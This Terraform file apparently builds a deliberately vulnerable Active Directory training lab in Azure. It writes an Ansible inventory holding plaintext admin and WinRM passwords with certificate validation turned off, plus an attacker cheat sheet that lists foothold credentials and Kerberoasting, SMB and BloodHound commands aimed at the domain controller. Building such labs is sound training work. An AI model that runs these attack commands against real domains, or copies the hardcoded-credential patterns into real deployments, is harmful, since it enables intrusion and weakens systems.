# =============================================================================
#  inventory.tf — auto-generate the Ansible inventory after apply
#  This is the glue that makes it one-button: Terraform writes the real public
#  IPs + admin password straight into ansible/inventory/azure_generated.ini,
#  so there's no manual copy/paste between terraform output and ansible.
# =============================================================================

resource "local_file" "ansible_inventory" {
  filename        = "${path.module}/../ansible/inventory/azure_generated.ini"
  file_permission = "0600"

  content = <<-EOT
    # AUTO-GENERATED by Terraform — do not edit by hand.
    # Regenerated on every `terraform apply`.

    [dc]
    HYDRA-DC ansible_host=${azurerm_public_ip.dc.ip_address} ws_name=HYDRA-DC

    [workstations]
    %{ for name, ip in var.workstation_ips ~}
    ${name} ansible_host=${azurerm_public_ip.ws[name].ip_address} ws_name=${name} ws_ip=${ip}
    %{ endfor ~}

    [all:vars]
    ansible_connection=winrm
    ansible_user=${var.admin_username}
    ansible_password=${var.admin_password}
    ansible_winrm_transport=ntlm
    ansible_winrm_server_cert_validation=ignore
    ansible_port=5986
    dc_admin_password=P@$$w0rd
  EOT

  depends_on = [
    azurerm_virtual_machine_extension.winrm
  ]
}

# Handy: print the attacker cheat-sheet after apply
resource "local_file" "attack_info" {
  filename = "${path.module}/../ATTACK_FROM_KALI.txt"
  content  = <<-EOT
    ================================================================
     MARVEL.local lab — deployed to Azure
     Attack these from your home Kali (your IP is allowed by the NSG)
    ================================================================

    DC (HYDRA-DC)     : ${azurerm_public_ip.dc.ip_address}   (private 10.0.2.10)
    %{ for name, ip in var.workstation_ips ~}
    ${name}  : ${azurerm_public_ip.ws[name].ip_address}   (private ${ip})
    %{ endfor ~}

    Domain : MARVEL.local
    Foothold creds : MARVEL\fcastle : Password1

    --- Add to /etc/hosts on your Kali (use the DC's PUBLIC ip) ---
    ${azurerm_public_ip.dc.ip_address} hydra-dc.marvel.local marvel.local MARVEL

    --- Quick wins (routed attacks work from home) ---
    nxc smb ${azurerm_public_ip.dc.ip_address} -u fcastle -p Password1 -d MARVEL.local
    impacket-GetUserSPNs -request -dc-ip ${azurerm_public_ip.dc.ip_address} MARVEL.local/fcastle:Password1
    bloodhound-python -u fcastle -p Password1 -d MARVEL.local -ns ${azurerm_public_ip.dc.ip_address} -c All --zip

    NOTE: LLMNR poisoning / NTLM-relay / mitm6 need layer-2 adjacency and will
    NOT work over the internet. Everything else (enum, Kerberoast, DCSync,
    BloodHound, PtH, psexec) works fine routed from home. For the broadcast
    attacks, deploy a Kali in-Azure on the same subnet (see docs/deploy.md).
  EOT

  depends_on = [
    azurerm_public_ip.dc,
    azurerm_public_ip.ws
  ]
}
